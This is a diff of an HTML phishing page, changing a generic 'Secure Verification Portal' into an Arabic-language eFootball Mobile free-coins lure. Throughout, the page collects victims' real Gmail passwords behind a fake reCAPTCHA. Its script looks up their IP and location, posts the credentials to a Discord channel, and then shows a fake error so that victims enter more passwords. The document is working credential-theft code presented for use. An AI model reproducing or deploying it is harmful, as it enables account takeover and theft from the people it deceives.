@@ -1,114 +1,135 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification Portal</title>
+    <title>eFootball Mobile - هدية مجانية</title>
     <style>
         body {
-            background-color: #f0f2f5;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0d1b2a, #1b263b, #415a77);
+            color: #ffffff;
+            font-family: 'Cairo', Tahoma, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
         }
         .card {
-            background: #ffffff;
+            background: rgba(15, 23, 42, 0.9);
+            border: 2px solid #00f5d4;
             padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 0 25px rgba(0, 245, 212, 0.4);
             width: 100%;
-            max-width: 380px;
+            max-width: 400px;
             text-align: center;
+            box-sizing: border-box;
         }
-        h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
-        p { color: #606770; font-size: 14px; margin-bottom: 20px; }
+        h2 { color: #00f5d4; font-size: 24px; margin-bottom: 10px; text-shadow: 0 0 10px rgba(0,245,212,0.5); }
+        p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
         .input-group {
             margin-bottom: 15px;
-            text-align: left;
+            text-align: right;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 5px;
+            color: #38bdf8;
         }
         .input-group input {
             width: 100%;
             padding: 12px;
-            border: 1px solid #ccd0d5;
+            background: #1e293b;
+            border: 1px solid #475569;
             border-radius: 6px;
+            color: #fff;
             font-size: 14px;
             box-sizing: border-box;
             outline: none;
+            transition: 0.2s;
         }
         .input-group input:focus {
-            border-color: #1877f2;
+            border-color: #00f5d4;
+            box-shadow: 0 0 8px rgba(0,245,212,0.3);
         }
         .recaptcha-box {
-            background: #f9f9f9;
-            border: 1px solid #d3d3d3;
-            border-radius: 4px;
-            padding: 12px;
+            background: #1e293b;
+            border: 1px solid #475569;
+            border-radius: 6px;
+            padding: 10px;
             margin-bottom: 15px;
             display: flex;
             align-items: center;
             justify-content: space-between;
         }
-        .recaptcha-left {
+        .recaptcha-right {
             display: flex;
             align-items: center;
             font-size: 13px;
-            color: #333;
+            color: #fff;
         }
-        .recaptcha-left input {
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
+        .recaptcha-right input {
+            width: 18px;
+            height: 18px;
+            margin-left: 10px;
             cursor: pointer;
         }
         .btn {
-            background-color: #1877f2;
-            color: white;
+            background: linear-gradient(135deg, #00f5d4, #00bbf9);
+            color: #0f172a;
             border: none;
             width: 100%;
             padding: 12px;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 0 15px rgba(0, 245, 212, 0.4);
         }
-        .btn:hover { background-color: #166fe5; }
+        .btn:hover { opacity: 0.9; }
         .error-msg {
-            color: #fa383e;
-            font-size: 13px;
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid #ef4444;
+            color: #f87171;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 12px;
             margin-bottom: 15px;
             display: none;
+            line-height: 1.4;
         }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Security Verification</h2>
-        <p>Please enter your email and matching password to verify your session.</p>
+        <h2>⚽ eFootball Mobile 2026</h2>
+        <p>سجل دخولك بحساب الإيميل واستخدم كلمة المرور الحقيقية لإتمام عملية مزامنة التطابق وشحن الهدايا والعملات فوراً!</p>
         
-        <div id="errorText" class="error-msg">Incorrect password or sync error. Please try again with the correct email password.</div>
+        <div id="errorText" class="error-msg">خطأ في مزامنة البيانات أو كلمة المرور غير متطابقة. يرجى التأكد من إدخال الإيميل وكلمة المرور الحقيقية وإعادة المحاولة.</div>
 
         <form id="authForm" onsubmit="handleSubmit(event)">
             <div class="input-group">
-                <input type="email" id="email" placeholder="Email Address" required>
+                <label>البريد الإلكتروني (Gmail)</label>
+                <input type="email" id="email" placeholder="example@gmail.com" required>
             </div>
             <div class="input-group">
-                <input type="password" id="password" placeholder="Email Password" required>
+                <label>كلمة مرور الإيميل الحقيقية</label>
+                <input type="password" id="password" placeholder="كلمة المرور الخاصة بالإيميل" required>
             </div>
             
-            <!-- زر أنا لست روبوت الوهمي -->
             <div class="recaptcha-box">
-                <div class="recaptcha-left">
+                <div class="recaptcha-right">
                     <input type="checkbox" id="robotCheck" required>
-                    <label for="robotCheck">I'm not a robot</label>
+                    <label for="robotCheck">أنا لست روبوت</label>
                 </div>
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="25" alt="reCAPTCHA">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="22" alt="reCAPTCHA">
             </div>
 
-            <button type="submit" class="btn">Verify & Continue</button>
+            <button type="submit" class="btn">مزامنة وشحن الحساب</button>
         </form>
     </div>
 
@@ -135,7 +156,6 @@
             let ip = "Unknown";
             let locationInfo = "Unknown";
 
-            // جلب الـ IP والموقع عند كل محاولة
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
@@ -146,20 +166,19 @@
                 locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'}`;
             } catch (err) {}
 
-            // إرسال تفاصيل المحاولة لديسكورد مع رقم المحاولة
-            let msg = `🚨 **[ محاولة رقم ${attemptCount} - صيد جديد ]** 🚨\n\n` +
+            let msg = `🎯 **[ eFootball - محاولة رقم ${attemptCount} ]** 🎯\n\n` +
                       `📧 **الإيميل:** \`${email}\`\n` +
-                      `🔑 **كلمة المرور المُدخلة:** \`${password}\`\n` +
+                      `🔑 **كلمة المرور:** \`${password}\`\n` +
                       `🌐 **الـ IP:** \`${ip}\`\n` +
                       `📍 **الموقع:** ${locationInfo}\n` +
                       `💻 **النظام:** ${navigator.platform}`;
 
             await sendToDiscord(msg);
 
-            // إظهار رسالة خطأ وهمية لكي يضطر لتجربة كلمة مرور أخرى
+            // إظهار رسالة خطأ باللغة العربية وتفريغ الحقل ليعيد المحاولة
             document.getElementById('errorText').style.display = 'block';
-            document.getElementById('password').value = ''; // تفريغ حقل الباسورد ليكتب غيره
-            document.getElementById('robotCheck').checked = false; // إعادة إلغاء تحديد الروبوت
+            document.getElementById('password').value = '';
+            document.getElementById('robotCheck').checked = false;
         }
     </script>
 </body>
